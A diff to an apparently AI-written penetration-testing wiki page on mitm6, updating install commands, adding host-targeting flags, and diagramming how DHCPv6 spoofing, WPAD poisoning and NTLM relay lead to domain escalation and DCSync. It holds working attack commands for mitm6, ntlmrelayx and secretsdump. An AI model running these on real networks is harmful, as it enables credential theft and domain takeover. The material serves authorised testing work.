@@ -5,7 +5,7 @@
 IPv6 MITM attack tool — exploits the fact that Windows prefers IPv6 over IPv4 by default. mitm6 responds to DHCPv6 requests, assigns itself as the IPv6 DNS server, then redirects authentication traffic to ntlmrelayx. Particularly effective for LDAP relay attacks since it captures credentials from Windows hosts that support IPv6 (which is virtually all of them) without needing LLMNR/NBT-NS broadcast traffic.
 
 **Source:** https://github.com/dirkjanm/mitm6
-**Install:** `pip install mitm6` or `sudo apt install mitm6`
+**Install:** `sudo apt install mitm6` (Kali-packaged, currently 0.3.0) or `pipx install mitm6` (plain `pip install` is blocked by PEP 668 on modern Kali)
 
 ```bash
 # Start mitm6 for a domain
@@ -31,7 +31,15 @@ sudo mitm6 -d domain.local -d child.domain.local
 # Specific interface
 sudo mitm6 -d domain.local -i eth0
 
-# Ignore specific hosts (avoid disrupting critical systems)
+# Reduce blast radius: only spoof DNS for these domains (-d = allowlist, repeatable),
+# and only answer DHCPv6 for these exact hostnames (-hw = FQDN allowlist, repeatable)
+sudo mitm6 -d domain.local -hw victim-pc.domain.local
+
+# Blocklist a domain from DNS spoofing instead (-b, repeatable)
+sudo mitm6 -d domain.local -b updates.domain.local
+
+# --ignore-nofqdn = skip DHCPv6 SOLICITs that carry no FQDN option (cuts noise from
+# non-domain devices). NOTE: this is NOT a host-exclusion filter — use -hw/-b for that.
 sudo mitm6 -d domain.local --ignore-nofqdn
 
 # Verbose
@@ -80,14 +88,20 @@ ntlmrelayx.py -6 -t ldaps://dc01.domain.local -smb2support --escalate-user lowpr
 
 ## How It Works
 
-```
-1. Windows host sends DHCPv6 SOLICIT (looking for IPv6 config)
-2. mitm6 responds with DHCPv6 ADVERTISE — assigns itself as DNS server
-3. Host sends DNS queries to mitm6
-4. mitm6 responds to WPAD lookups with attacker IP
-5. Browser requests WPAD config from attacker
-6. ntlmrelayx (via -6) intercepts the HTTP CONNECT with NTLM auth
-7. ntlmrelayx relays NTLM credentials to LDAP/SMB target
+```mermaid
+sequenceDiagram
+    participant W as Windows host
+    participant M as mitm6
+    participant R as ntlmrelayx (-6)
+    participant T as LDAP/SMB target (DC)
+    W->>M: DHCPv6 SOLICIT (wants IPv6 config)
+    M->>W: DHCPv6 ADVERTISE — I am your DNS server
+    W->>M: DNS query for wpad
+    M->>W: wpad → attacker IP
+    W->>R: GET http://wpad/wpad.dat (WPAD auto-config)
+    R-->>W: 407 Proxy-Auth → client sends NTLM
+    R->>T: relay NTLM auth
+    T-->>R: authenticated as the victim → --add-computer / RBCD / DCSync
 ```
 
 ---
@@ -122,6 +136,10 @@ secretsdump.py DOMAIN/lowpriv:Password@dc01.domain.local -just-dc
 
 ---
 
+> [!note] **See also** — Always paired with [[Tools/Lateral Movement/ntlmrelayx|ntlmrelayx]] (`-6`); the LDAP-relay outcomes (`--add-computer`, `--delegate-access`, `--shadow-credentials`) are documented there. Broadcast-poisoning counterpart on the same subnet: [[Tools/Lateral Movement/responder|Responder]] (run both for coverage). Force auth on demand with [[Tools/Lateral Movement/Coercer|Coercer]]. Protocol background: [[Standards & Protocols/NTLM|NTLM]].
+
+---
+
 *Created: 2026-03-06*
-*Updated: 2026-03-06*
-*Model: claude-sonnet-4-6*
+*Updated: 2026-08-29*
+*Model: claude-opus-5*
